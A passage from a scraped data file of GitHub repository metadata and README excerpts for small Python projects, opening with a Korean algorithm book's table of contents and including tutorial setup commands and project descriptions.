3.7 코드 / C++ 코드 / Java 코드)   실전  음료수 얼려 먹기: (Python 3.7 코드 / C++ 코드 / Java 코드) 미로 탈출: (Python 3.7 코드 / C++ 코드 / Java 코드)    6장 정렬  이론  기준에 따라서 데이터를 정렬 선택 정렬: (Python 3.7 코드 / C++ 코드 / Java 코드) 스와프(Swap): (Python 3.7 코드 / C++ 코드 / Java 코드) 삽입 정렬: (Python 3.7 코드 / C++ 코드 / Java 코드) 퀵 정렬: (Python 3.7 코드 / C++ 코드 / Java 코드) 파이썬의 장점을 살린 퀵 정렬: Python 3.7 코드 계수 정렬: (Python 3.7 코드 / C++ 코드 / Java 코드) 정렬 라이브러리 기본 예제: (Python 3.7 코드 / C++ 코드 / Java 코드) 정렬 라이브러리 키(Key) 기준 정렬 예제: (Python 3.7 코드 / C++ 코드 / Java 코드)   실전  위에서 아래로: (Python 3.7 코드 / C++ 코드 / Java 코드) 성적이 낮은 순서대로 학생 출력하기: (Python 3.7 코드 / C++ 코드 / Java 코드) 두 배열의 원소 교체: (Python 3.7 코드 / C++ 코드 / Java 코드)    7장 이진 탐색  이론  범위를 반씩 좁혀가는 탐색 순차 탐색: (Python 3.7 코드 / C++ 코드 / Java 코드) 재귀 함수를 이용한 이진 탐색: (Python 3.7 코드 / C++ 코드 / Java 코드) 반복문을 이용한 이진 탐색: (Python 3.7 코드 / C++ 코드 / Java 코드) 파이썬에서 빠르게 입력 받기: Python 3.7 코드   실전  부품 찾기  이진 탐색으로 해결: (Python 3.7 코드 / C++ 코드 / Java 코드) 계수 정렬로 해결: (Python 3.7 코드 / C++ 코드 / Java 코드) 집합(Set) 자료형으로 해결: (Python 3.7 코드 / C++ 코드 / Java 코드)   떡볶이 떡 만들기: (Python 3.7 코드 / C++ 코드 / Java 코드)    8장 다이나믹 프로그래밍  이론  비효율적인 피보나치 수열 구현: (Python 3.7 코드 / C++ 코드 / Java 코드) 피보나치 수열 (Top-bottom): (Python 3.7 코드 / C++ 코드 / Java 코드) 피보나치 수열 (Bottom-top): (Python 3.7 코드 / C++ 코드 / Java 코드)   실전  1로 만들기: (Python 3.7 코드 / C++ 코드 / Java 코드) 개미 전사: (Python 3.7 코드 / C++ 코드 / Java 코드) 바닥 공사: (Python 3.7 코드 / C++ 코드 / Java 코드) 효율적인 화폐 구성: (Python 3.7 코드 / C++ 코드 / Java 코드)    9장 최단 경로  이론  가장 빠른 길 찾기 간단한 다익스트라 알고리즘: (Python 3.7 코드 / C++ 코드 / Java 코드) 개선된 다익스트라 알고리즘 (우선순위 큐): (Python 3.7 코드 / C++ 코드 / Java 코드) 플로이드 워셜 알고리즘: (Python 3.7 코드 / C++ 코드 / Java 코드)   실전  미래 도시: (Python 3.7 코드 / C++ 코드 / Java 코드) 전보: (Python 3.7 코드 / C++ 코드 / Java 코드)    10장 기타 그래프 이론  이론  다양한 그래프 알고리즘 간단한 서로소 집합 알고리즘: (Python 3.7 코드 / C++ 코드 / Java 코드) 개선된 서로소 집합 알고리즘 (경로 압축): (Python 3.7 코드 / C++ 코드 / Java 코드) 서로소 집합을 활용한 사이클 판별: (Python 3.7 코드 / C++ 코드 / Java 코드) 크루스칼 알고리즘: (Python 3.7 코드 / C++ 코드 / Java 코드) 위상 정렬: (Python 3.7 코드 / C++ 코드 / Java 코드)   실전  팀 결성: (Python 3.7 코드 / C++ 코드 / Java 코드) 도시 분할 계획: (Python 3.7 코드 / C++ 코드 / Java 코드) 커리큘럼: (Python 3.7 코드 / C++ 코드 / Java 코드)    Part 3 알고리즘 유형별 기출문제 11장 그리디  모험가 길드 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 곱하기 혹은 더하기 (Facebook 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 문자열 뒤집기 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 만들 수 없는 금액 (K 대회 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 볼링공 고르기 (S 기관 입학 테스트): (Python 3.7 코드 / C++ 코드 / Java 코드) 무지의 먹방 라이브 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드)  12장 구현  럭키 스트레이트 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 문자열 재정렬 (Facebook 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 문자열 압축 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드) 자물쇠와 열쇠 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드) 뱀 (삼성): (Python 3.7 코드 / C++ 코드 / Java 코드) 기둥과 보 설치 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드) 치킨 배달 (삼성): (Python 3.7 코드 / C++ 코드 / Java 코드) 외벽 점검 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드)  13장 DFS/BFS  특정 거리의 도시 찾기 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 연구소 (삼성): (Python 3.7 코드 / C++ 코드 / Java 코드) 경쟁적 전염 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 괄호 변환 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드) 연산자 끼워 넣기 (삼성): (Python 3.7 코드 / C++ 코드 / Java 코드) 감시 피하기 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 인구 이동 (삼성): (Python 3.7 코드 / C++ 코드 / Java 코드) 블록 이동하기 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드)  14장 정렬  국영수 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 안테나 (국내 S 교육 기관 선발 평가): (Python 3.7 코드 / C++ 코드 / Java 코드) 실패율 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드) 카드 정렬하기 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드)  15장 이진 탐색  정렬된 배열에서 특정 수의 개수 구하기 (Zoho 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 고정점 찾기 (Amazon 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 공유기 설치 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 가사 검색 (카카오): (Python 3.7 코드 / C++ 코드 / Java 코드)  16장 다이나믹 프로그래밍  금광 (Flipkart 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 정수 삼각형 (IOI): (Python 3.7 코드 / C++ 코드 / Java 코드) 퇴사 (삼성): (Python 3.7 코드 / C++ 코드 / Java 코드) 병사 배치하기 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 못생긴 수 (Google 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 편집 거리 (Goldman Sachs 인터뷰 기출): (Python 3.7 코드 / C++ 코드 / Java 코드)  17장 최단 경로  플로이드 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 정확한 순위 (K 대회 기출): (Python 3.7 코드 / C++ 코드 / Java 코드) 화성 탐사 (ICPC): (Python 3.7 코드 / C++ 코드 / Java 코드) 숨바꼭질 (USACO): (Python 3.7 코드 / C++ 코드 / Java 코드)  18장 기타 그래프 이론  여행 계획 (핵심 유형): (Python 3.7 코드 / C++ 코드 / Java 코드) 탑승구 (CCC): (Python 3.7 코드 / C++ 코드 / Java 코드) 어두운 길 (University of Ulm Local Contest): (Python 3.7 코드 / C++ 코드 / Java 코드) 행성 터널 (COCI): (Python 3.7 코드 / C++ 코드 / Java 코드) 최종 순위 (ICPC): (Python 3.7 코드 / C++ 코드 / Java 코드)  19장 2020년 상반기 삼성전자 기출문제  아기 상어 (삼성): Python 3.7 코드 청소년 상어 (삼성): Python 3.7 코드 어른 상어 (삼성): Python 3.7 코드  Part 4 부록 부록 A 코딩 테스트를 위한 파이썬 문법  자료형  수 자료형  정수형 실수형 수 자료형의 연산   리스트 자료형  리스트 만들기 리스트 인덱싱 리스트 슬라이싱 리스트 컴프리헨션 리스트 관련 메서드   문자열 자료형  문자열 초기화 문자열 연산   튜플 자료형  튜플 초기화   사전 자료형  사전 자료형 초기화 사전에서 키로 검색 사전 자료형 관련 메서드   집합 자료형  집합 초기화 집합 연산 집합 관련 메서드     조건문  조건문 예시 1 조건문 예시 2 조건문 예시 3 pass 키워드 사용 예시 조건문 한 줄에 쓰기 조건부 표현식   반복문  while 문법  while 문법 예시 1 while 문법 예시 2   for 문법  for 문법 예시 1 for 문법 예시 2 for 문법 예시 3 for 문법 예시 4     함수  더하기 함수 global 키워드 사용 예시   입출력  코딩 테스트에서 입력을 위한 전형적인 코드 공백을 기준으로 적은 수의 데이터 입력 readline()으로 빠르게 입력 받기 f-string 사용 예시   주요 라이브러리의 문법과 유의점  내장 함수 itertools heapq bisect collections math   자신만의 알고리즘 노트 만들기  부록 B 기타 알고리즘  이론  소수 판별: (Python 3.7 코드 / C++ 코드 / Java 코드) 에라토스테네스의 체: (Python 3.7 코드 / C++ 코드 / Java 코드) 특정한 합을 가지는 부분 연속 수열 찾기 (투 포인터): (Python 3.7 코드 / C++ 코드 / Java 코드) 정렬되어 있는 두 리스트 합치기 (투 포인터): Python 3.7 코드 구간 합: (Python 3.7 코드 / C++ 코드 / Java 코드) 순열: Python 3.7 코드 조합: Python 3.7 코드   실전  소수 구하기 (핵심 유형): Python 3.7 코드 암호 만들기 (핵심 유형): Python 3.7 코드    부록 C 개발형 코딩 테스트  서버와 클라이언트 REST API JSON API 호출 실습  API 호출 실습 1 API 호출 실습 2 회원 정보 처리 실습    부록 D 알고리즘 유형별 문제 풀이 추가 보충 자료  책에서는 자세히 다루지 않지만 독자의 요청으로 추가적으로 제공합니다.   트리(Tree)  트리의 순회: (Python 3.7 코드)   우선순위 큐 (Priority Queue)  우선순위 큐 라이브러리를 활용한 힙 정렬: (Python 3.7 코드 / C++ 코드)   바이너리 인덱스 트리 (Binary Indexed Tree, BIT, Fenwick Tree)  구간 합 구하기: (Python 3.7 코드 / C++ 코드)   벨만-포드 (Bellman-Ford) 최단 경로 알고리즘  음수 간선이 포함된 그래프에서의 최단 경로 찾기: (Python 3.7 코드 / C++ 코드)   최소 공통 조상 (Lowest Common Ancestor, LCA)  LCA 기본: (Python 3.7 코드 / C++ 코드) LCA 심화: (Python 3.7 코드 / C++ 코드)    
417594720;argo-cd-python-demo;https://github.com/tao12345666333/argo-cd-python-demo;Python;2021-10-15T18:14:07Z;0;0;0;
417653745;Python_CSV_Parser;https://github.com/jcnghm/Python_CSV_Parser;Python;2021-10-15T22:29:14Z;0;0;0;A Simple Python CSV Parser  CSV Parser  
417646919;Python-Moving-Calculator-;https://github.com/ElisaTurner/Python-Moving-Calculator-;Python;2021-10-15T21:56:48Z;0;0;0;Python-Moving-Calculator- This calculator calculates how long it would take in order to move  if saving a certain amount of money per week 
417626538;bqrli-python-bot-discord;https://github.com/bqrli/bqrli-python-bot-discord;Python;2021-10-15T20:29:13Z;0;0;0;
417650248;Python-Applications-and-Games;https://github.com/StellaNguyen68/Python-Applications-and-Games;HTML;2021-10-15T22:11:18Z;0;0;0;
417593358;Python_Functions_Excercise;https://github.com/JuanAntonaccio/Python_Functions_Excercise;Python;2021-10-15T18:08:52Z;0;0;0;"     🐍 Python Funtions Tutorial and Exercises By @alesanchezr and other contributors at 4Geeks Academy        Learn and practice Python Functions: Declaring a functoin, Calling a function, function scopes, nest functions, function recursivity and many other functional concepts. The entire tutorial is 👆 interactive, ✅ auto-graded and with. 📹 video tutorials. 📚 Table of contents:   1. Python for Beginners   2. Practice Looping Lists and Tuples 3. Practice functions ← 🔥 your are here now   4. Master Python (intermediate) 5. Python API Requests 6. What next? Request a new tutorial or collaborate. We will feature your profile in our list of contributors  These exercises were built in collaboration, we need you! If you find any bugs or misspells plese contribute and report them.    One click installation:  Local Installation  Make sure you have learnpack installed, node.js version 14+ and python version 3+. This is the command to install learnpack:  $ npm i learnpack -g && learnpack plugins:install learnpack-python   Clone or download this repository. Once you finish downloading, you will find a new folder with a subdirectory ""exercises"" that contains all the exercises within.  $ git clone https://github.com/4GeeksAcademy/python-functions-programming-exercises.git   Start the tutorial/exercises by running the following command from the root of the project:  $ cd python-functions-programming-exercises $ pip install pytest==4.4.2 mock pytest-testdox $ learnpack start How are the exercises organized? Each exercise is a small react application containing the following files:  app.py: represents the entry python file that will be executed by the computer. README.md: contains exercise instructions. test.py: you don't have to open this file, it contains the testing script for the exercise.  Contributors Thanks goes to these wonderful people (emoji key):  Alejandro Sanchez (alesanchezr), contribution: (coder) 💻 (idea) 🤔, (build-tests) ⚠️, (pull-request-review) 👀 (build-tutorial) ✅ (documentation) 📖 Paolo (plucodev), contribution: (bug reports) 🐛, contribution: (coder), (translation) 🌎 Marco Gómez (marcogonzalo), contribution: (bug reports) 🐛, (translation) 🌍  This project follows the all-contributors specification. Contributions of any kind are welcome! "
417626474;basitHesapMakinesiPython;https://github.com/sercanefe/basitHesapMakinesiPython;Python;2021-10-15T20:28:55Z;1;1;0;
417636858;to-teach-python-basic;https://github.com/yo14/to-teach-python-basic;Python;2021-10-15T21:09:41Z;0;0;0;to-teach-python-basic Ini adalah project pertama saya dengan Python Wohooo! 
417574873;Python-Video-Downloader;https://github.com/rawlin/Python-Video-Downloader;Python;2021-10-15T16:58:28Z;0;0;0;
417638502;ConsolidandoArquivosPython;https://github.com/AlexAlbino/ConsolidandoArquivosPython;;2021-10-15T21:16:19Z;0;0;0;ConsolidandoArquivosPython 
417642801;python-hw-2021;https://github.com/cockandballstorture/python-hw-2021;Jupyter Notebook;2021-10-15T21:35:02Z;0;0;0;
417628010;data_structures_python;https://github.com/ma7modsidky/data_structures_python;Python;2021-10-15T20:36:03Z;0;0;0;
417633728;CursoPythonFinancas;https://github.com/WesleyCastilho/CursoPythonFinancas;;2021-10-15T20:57:24Z;0;0;0;
417591043;jose-udemy-python;https://github.com/terryinfcco/jose-udemy-python;Python;2021-10-15T18:00:25Z;0;0;0;jose-udemy-python Code from Jose Python Course. 
417617427;my-first-python-app;https://github.com/Seany64/my-first-python-app;Python;2021-10-15T19:47:54Z;0;0;0;
417621087;ticTacToe-python;https://github.com/BR19-gh/ticTacToe-python;Python;2021-10-15T20:03:20Z;0;0;0;ticTacToe-python What is the game? It's a terminal based tic-tac-toe game written in Python. Gamemodes There's two game modes:  Single Player:  Player plays against a logic (Computer) which choose any empty place to play in   Multiplayers:  Two players play against each other    Properties   In multiplayer, the 1st player can choose to be any character ( X or O) and the other player will be marked with the remaining one   In single player, the player can choose to be any character ( X or O) and Computer will be marked with the remaining one   First turn will be randomly determined (between 1st player and 2nd player in multiplayer, and between player and Computer in single player)   Input errors catchig   Starting Up You should first download Python-3.9 then run the file in the Python terminal Some Game Preview Start Menu Welcome to <X && O>.  Choose form the menu: 1- Single Player 2- Multi-Players   Choosing Character Player-1, choose your character, either X or O:    Gameplay % Computer played in position #3 %  The current state of the board is: ------------- | O | X | O | ------------- | - | X | - | ------------- | - | O | - | -------------   Use the below figure as a reference: ------------- | 1 | 2 | 3 | ------------- | 4 | 5 | 6 | ------------- | 7 | 8 | 9 | -------------  Player-X choose position between 1 to 9:    Wining Message ------------- | X | X | X | ------------- | O | O | - | ------------- | O | - | - | ------------- Player-X won, congrats. Press Enter to Exit   
417572495;18.1_Python_Introduction-;https://github.com/kiitos00/18.1_Python_Introduction-;Python;2021-10-15T16:49:59Z;0;0;0;
417643630;alpine-python-wheels;https://github.com/six8/alpine-python-wheels;;2021-10-15T21:39:28Z;0;0;0;alpine-python-wheels Some wheels built for Alpine Linux until the projects have PEP 656 support 
417645658;Meus_Projetos_Python;https://github.com/Croneydbr/Meus_Projetos_Python;;2021-10-15T21:50:06Z;0;0;0;Meus_Projetos_Python Meus projetos pessoais de python 
417634219;python-text-adventure;https://github.com/Lusi0/python-text-adventure;Python;2021-10-15T20:59:18Z;0;0;0;python-text-adventure 
417592451;Python-Projects-For-Begginers;https://github.com/TanmayProgrammer-13/Python-Projects-For-Begginers;Python;2021-10-15T18:05:20Z;1;1;0;
417589175;Intro-to-python-3005-;https://github.com/Abby-w/Intro-to-python-3005-;Python;2021-10-15T17:53:00Z;0;0;0;
417622098;python-tkinter-examples;https://github.com/muhammadkh4n/python-tkinter-examples;Python;2021-10-15T20:08:10Z;0;0;0;
417623973;python-data-visualization;https://github.com/AbigailCobb/python-data-visualization;Jupyter Notebook;2021-10-15T20:16:47Z;0;0;0;python-data-visualization This is an example of my work in Python via a Jupyter notebook. 
417578939;Python_ML_Regression;https://github.com/MunSikPark/Python_ML_Regression;Jupyter Notebook;2021-10-15T17:13:31Z;0;0;0;
417587219;dice-game-python;https://github.com/stephanmingoes/dice-game-python;Python;2021-10-15T17:45:24Z;0;0;0;dice-game-python This is a simple dice game created in pthon 🐍. 
417593704;pythonic-garage-band;https://github.com/duajaradat/pythonic-garage-band;Python;2021-10-15T18:10:09Z;0;0;0;
417610691;python-course-Jawan-pakistan;https://github.com/mhamza-ali/python-course-Jawan-pakistan;Jupyter Notebook;2021-10-15T19:18:15Z;0;0;0;python-course-Jawan-pakistan 
417646156;Introducao-programacao-python;https://github.com/felipepleao/Introducao-programacao-python;;2021-10-15T21:52:41Z;0;0;0;
417660220;SortingAlgorithms_Python;https://github.com/laotraescuelita/SortingAlgorithms_Python;Python;2021-10-15T23:08:50Z;0;0;0;SortingAlgorithms_Python Sorting algorithms such as bubblesort, insertion but using pygame sometimes La finalidad es aprender como funcionan algunos algoritmos de ordenamiento y su implementacion en Python. Al mismo tiempo mientras sea capaz los implementare en pygame para poder visualizar su compartamiento. Con el tiemp espero ser yo quien los relice de manera ma robusta y/o con ayuda de alguien mas. Espero que les sea de utilidad y que ayuden a quien deban de ayudar. 
417633830;github-api-python;https://github.com/jsidberry/github-api-python;Python;2021-10-15T20:57:52Z;0;0;0;"github-api-python GET /users/defunkt $ curl https://api.github.com/users/jsidberry $ curl -i https://api.github.com/users/jsidberry Use a -u flag to set your username: $ curl -i -u jsidberry https://api.github.com/users/jsidberry or with the token (best to use env_vars) $ curl -i -u ""jsidberry:$token"" https://api.github.com/users/jsidberry List Repos $ curl -i https://api.github.com/users/jsidberry/repos "
417646340;python-project-template;https://github.com/mbanzai/python-project-template;Makefile;2021-10-15T21:53:31Z;0;0;0;Python Project Template A low dependency and really simple to start project template for Python Projects. See also  Flask-Project-Template for a full feature Flask project including database, API, admin interface, etc. FastAPI-Project-Template The base to start an openapi project featuring: SQLModel, Typer, FastAPI, JWT Token Auth, Interactive Shell, Management Commands.  HOW TO USE THIS TEMPLATE  DO NOT FORK this is meant to be used from Use this template feature.   Click on Use this template Give a name to your project (e.g. my_awesome_project recommendation is to use all lowercase and underscores separation for repo names.) Wait until the first run of CI finishes (Github Actions will process the template and commit to your new repo) If you want codecov Reports and Automatic Release to PyPI On the new repository settings->secrets add your PIPY_API_TOKEN and CODECOV_TOKEN (get the tokens on respective websites) Read the file CONTRIBUTING.md Then clone your new project and happy coding!   NOTE: WAIT until first CI run on github actions before cloning your new project.  What is included on this template?  🖼️ Templates for starting multiple application types:  Basic low dependency Python program (default) use this template Flask with database, admin interface, restapi and authentication use this template. or Run make init after cloning to generate a new project based on a template.   📦 A basic setup.py file to provide installation, packaging and distribution for your project. Template uses setuptools because it's the de-facto standard for Python packages, you can run make switch-to-poetry later if you want. 🤖 A Makefile with the most useful commands to install, test, lint, format and release your project. 📃 Documentation structure using mkdocs 💬 Auto generation of change log using gitchangelog to keep a HISTORY.md file automatically based on your commit history on every release. 🐋 A simple Containerfile to build a container image for your project. Containerfile is a more open standard for building container images than Dockerfile, you can use buildah or docker with this file. 🧪 Testing structure using pytest ✅ Code linting using flake8 📊 Code coverage reports using codecov 🛳️ Automatic release to PyPI using twine and github actions. 🎯 Entry points to execute your program using python -m <python_project_template> or $ python_project_template with basic CLI argument parsing. 🔄 Continuous integration using Github Actions with jobs to lint, test and release your project on Linux, Mac and Windows environments.   Curious about architectural decisions on this template? read ABOUT_THIS_TEMPLATE.md If you want to contribute to this template please open an issue or fork and send a PULL REQUEST.  ❤️ Sponsor this project  python_project_template   Awesome python_project_template created by mbanzai Install it from PyPI pip install python_project_template Usage from python_project_template import BaseClass from python_project_template import base_function  BaseClass().base_method() base_function() $ python -m python_project_template #or $ python_project_template Development Read the CONTRIBUTING.md file. 
417663544;RedSiegePython;https://github.com/dlmoratti/RedSiegePython;Python;2021-10-15T23:29:11Z;0;0;0;RedSiegePython The code along for learning infosec python 2021 Each project will have it's own requirements.txt file. This is intended to provide it's dependencies on a per project basis. 
417639334;Python_Loops_List_excercise;https://github.com/JuanAntonaccio/Python_Loops_List_excercise;Python;2021-10-15T21:19:23Z;0;0;0;"🐍 Python Loops & Lists Tutorial Exercises   By @alesanchezr and other contributors at 4Geeks Academy     Looping is one of the most challenging topics to grasp when learning how to code, learn all the possible ways to loop in python, looping lists, touples, dictionaries and other data-structures. The entire tutorial is 👆 interactive, ✅ auto-graded and with. 📹 video tutorials. 📚 Table of contents:   1. Python for Beginners   2. Practice Looping Lists and Tuples ← 🔥 your are here now   3. Practice functions  4. Master Python (intermediate) 5. Python API Requests 6. What next? Request a new tutorial or collaborate. We will feature your profile in our list of contributors  These exercises were built in collaboration, we need you! If you find any bugs or misspells plese contribute and report them.    One click installation:  Local Installation  Install learnpack, the package manager for learning tutorials and the html compiler plugin for learnpack, make sure you also have node.js 12+:  $ npm i learnpack -g $ learnpack plugins:install learnpack-python   Download this particular exercise using learnpack and cd into the folder:  $ learnpack download python-lists-loops-programming-exercises $ cd python-lists-loops-programming-exercises  Note: Once you finish downloading, you will find a ""exercises"" folder that contains all the exercises within.  Start the tutorial/exercises by running the following command at the same level were your bc.json file is:  $ $ pip3 install pytest==4.4.2 pytest-testdox mock $ learnpack start Note: The exercises have automatic grading but its very rigid and string, my recomendation is to ignore the tests and use them only as a recomendation or you can get frustrated.  ## How are the exercises organized?  Each exercise is a small python project containing the following files:  1. **app.py:** represents the entry python file that will be executed by the computer. 2. **README.md:** contains exercise instructions. 3. **test.py:** you don't have to open this file, it contains the testing script for the exercise.  ## Contributors  Thanks goes to these wonderful people ([emoji key](https://github.com/kentcdodds/all-contributors#emoji-key)):  1. [Alejandro Sanchez (alesanchezr)](https://github.com/alesanchezr), contribution: (coder) :computer: (idea) 🤔, (build-tests) :warning:, (pull-request-review) :eyes: (build-tutorial) :white_check_mark: (documentation) :book: 2. [Paolo (plucodev)](https://github.com/plucodev), contribution: (bug reports) :bug:, contribution: (coder), (translation) :earth_americas:  This project follows the [all-contributors](https://github.com/kentcdodds/all-contributors) specification. Contributions of any kind are welcome!  "
417611230;Ineuron-Assignment-;https://github.com/Shanmugapriyak08/Ineuron-Assignment-;;2021-10-15T19:20:50Z;0;0;0;Ineuron-Assignment- Python Assignment 
417584432;cnet;https://github.com/sawyermade/cnet;C++;2021-10-15T17:34:39Z;0;0;0;"ConceptNet Python Python tools to query ConceptNet assertions and NumberBatch embeddings. Setup Clone repo and enter directory: git clone git@github.com:sawyermade/cnet.git; cd cnet  Install Anaconda Environment conda env create -f environment.yml conda activate cnet  Get ConceptNet assertions and NumberBatch embeddings, test, and pickle: python3 get_data.py  Epic Kitchens Verb & Noun Paths How to use conceptnet.py Import class and load assertions+embeddings: from conceptnet import ConceptNet cnet = ConceptNet()  Get embedding for a specific concept: embedding = cnet.get_embedding('headset')  Get assertions for a specific concept (including assertions originating from other concepts -- ConceptNet assertions are directed): assertions = cnet.query_concept('headset')  Get assertions originating from a specific concept to any other concept: print(cnet.query_concept('headset', directed=True))  Get all assertions between two concepts (in any direction): print(cnet.query_edge('hand', 'arm'))  Get all assertions from one concept to another concept: print(cnet.query_edge('hand', 'arm', directed=True)) print(cnet.query_edge('arm', 'hand', directed=True))  "
417610096;even-and-odd-number-;https://github.com/zain-ul-abdin-z/even-and-odd-number-;;2021-10-15T19:15:50Z;0;0;0;
417661598;PySpark;https://github.com/Amro-source/PySpark;Python;2021-10-15T23:17:26Z;0;0;0;PySpark Python Sheets 
417593248;face-detection-sdd-in-python;https://github.com/kevalCoder9106/face-detection-sdd-in-python;;2021-10-15T18:08:29Z;0;0;0;face-detection-sdd-in-python face detection using RCNN method 
417603461;Python_Automation_Logging_Filenames_App;https://github.com/rebeccabartels/Python_Automation_Logging_Filenames_App;;2021-10-15T18:48:56Z;0;0;0;Python_Automation_Logging_Filenames_App 
417592700;face-detection-using-opencv-python;https://github.com/kumbhani11/face-detection-using-opencv-python;Python;2021-10-15T18:06:19Z;0;0;0;
417662027;Learn-python-the-hard-way;https://github.com/Shimul-ostfold/Learn-python-the-hard-way;Python;2021-10-15T23:20:22Z;0;0;0;
417584079;Exercicios-e-Praticas-em-Python;https://github.com/GregMasterBr/Exercicios-e-Praticas-em-Python;;2021-10-15T17:33:17Z;0;0;0;Resoluções de Exercícios ou Práticas em Python [1] - Curso em Video - Google Colab - https://colab.research.google.com/drive/1Kf_Cpfg5teUsk9kLNswwDzfPfwYEZ4Wm?usp=sharing [2] - Desavio DEVPRO+ Lista de Exercícios Python Brasil - Google Colab - https://colab.research.google.com/drive/1l2G23rAwKx5Rro3lOOx2b9YcYuAzN6Ab?usp=sharing [3] - Imersão Alura -  5 Aulas - Google Colab - https://colab.research.google.com/drive/1KhEYBZzh9FbJ4-lLIvMBlGH2HqoFEadW [4] - https://house-rocket-gregmaster.herokuapp.com/ - Case House Rocket Company - Feito na semana de conteúdo do Meigarom Aplicação hospedada no heroku, rodando o stremalit. 
417581228;int-python-junk-tracker-3000;https://github.com/spbk/int-python-junk-tracker-3000;Python;2021-10-15T17:22:22Z;0;0;0;"Junk Tracker 3000 You have been hired to build an inventory management system for your local junkyard! While they accept may different items, old vehicles are their most valuable, so they want to keep better track of all the different ones they have. Tasks  Allow for four different vehicle types (listed below) to be created and edited.  For each Vehicle type, only display the relevant fields to the user  For example: If a a Coupe is being created/edited, do not show the ""Automatic sliding doors"" field.   Use backend/src/database.py as a stubbed out database service to persist objects. It'll be wiped out each time you restart the backend, but should be sufficiet for our purposes.   After each vehicle is created, register it using the VehicleRegistrationService (at backend/src/vehicle_registration_service.py) and permanently associate that registration ID with the vehicle. List all vehicles on http://localhost:4200/vehicles with their type, nickname, mileage rating and registration ID  mileage rating is defined as:  low: mileage < 10,000 medium: 10,000 <= mileage < 100,000 high: 100,000 <= mileage      Vehicle Types  Sedan  Nickname: string Mileage: integer Wheels: 0-4, default: 4 Doors: 0-4, default: 4 Engine status: works, fixable, junk, default: works   Coupe  Nickname: string Mileage: integer Wheels: 0-4, default: 4 Doors: 0-2, default: 2 Engine status: works, fixable, junk, default: works   Mini-Van  Nickname: string Mileage: integer Wheels: 0-4, default: 4 Doors: 0-4, default: 4  For each door: (Tip: Make sure everything else is working before addressing this)  Sliding: boolean, default: false     Engine status: works, fixable, junk, default: works   Motorcycle  Nickname: string Mileage: integer Wheels: 0-2, default: 2 Engine status: works, fixable, junk, default: works Seat status: works, fixable, junk, default: works    Guildelines Please don't spend more than two (2) hours on this project! The goal is not to add every bell, whistle, feature and optimization that you can think of. The goal is to both see an example of working code that you write and see how you do implementing realistic (albeit contrived...) features. You will be judged on how accurately you complete the above tasks and the quality of the code you write. The backend has some routes stubbed out and the frontend has been initialized via Angular CLI. You are free to make any and all changes you'd like to complete the assignment. Getting Started See SETUP.md for instructions on how to get your development envrionment working. If you have any questions, especially regarding setup, please contact us so we can get it sorted out ASAP! When you are finished, push all changes to the repo on GitHub and email us that you've finished! Feel free to to open a pull request or leave any other comments on specific commits or the repo as you see fit. Notes  If you have any issues at all, especially with getting your development environment working, please reach out to us ASAP. Our intention isn't to make you troubleshoot an existing project's configuration. (You wouldn't spend the majority of your work day doing that in real life). We are more than happy to do that for you! Make your first priority getting everything to work! Save the bonus points for after you get things working all the way through. Do not worry about server-side rendering of any JavaScript React components Add any additional Python pckages, npm modules or other tools you'd like  "
417665674;Python-works-2021-v1;https://github.com/DjExE007/Python-works-2021-v1;Python;2021-10-15T23:40:44Z;0;0;0;
417575578;python-for-DS-L1;https://github.com/oevsuk/python-for-DS-L1;;2021-10-15T17:00:58Z;0;0;0;python-for-DS-L1 New Repository for practice python for Data science L1 
417599332;algo-trading;https://github.com/bwozniak27/algo-trading;Python;2021-10-15T18:31:56Z;0;0;0;
417576408;GuessingGame;https://github.com/abidhossan2231/GuessingGame;Python;2021-10-15T17:03:43Z;1;1;0;
417608922;Calculator_py;https://github.com/Danielvfrodrigues/Calculator_py;Python;2021-10-15T19:10:42Z;0;0;0;
417624353;Currency_Convertion_Ethiopian-Birr_to_Kenyan-Shilling;https://github.com/Zeru-Yosef/Currency_Convertion_Ethiopian-Birr_to_Kenyan-Shilling;Jupyter Notebook;2021-10-15T20:18:38Z;0;0;0;
417652202;Causalinference;https://github.com/youngminju-phd/Causalinference;Python;2021-10-15T22:21:08Z;0;0;0; Causal Inference in Python Causal Inference in Python, or Causalinference in short, is a software package that implements various statistical and econometric methods used in the field variously known as Causal Inference, Program Evaluation, or Treatment Effect Analysis. Work on Causalinference started in 2014 by Laurence Wong as a personal side project. It is distributed under the 3-Clause BSD license.  Important Links The official website for Causalinference is  https://causalinferenceinpython.org The most current development version is hosted on GitHub at  https://github.com/laurencium/causalinference Package source and binary distribution files are available from PyPi at  https://pypi.python.org/pypi/causalinference For an overview of the main features and uses of Causalinference, please refer to  https://github.com/laurencium/causalinference/blob/master/docs/tex/vignette.pdf A blog dedicated to providing a more detailed walkthrough of Causalinference and the econometric theory behind it can be found at  https://laurencewong.com/software/  Main Features  Assessment of overlap in covariate distributions Estimation of propensity score Improvement of covariate balance through trimming Subclassification on propensity score Estimation of treatment effects via matching, blocking, weighting, and least squares   Dependencies  NumPy: 1.8.2 or higher SciPy: 0.13.3 or higher   Installation Causalinference can be installed using pip: $ pip install causalinference  For 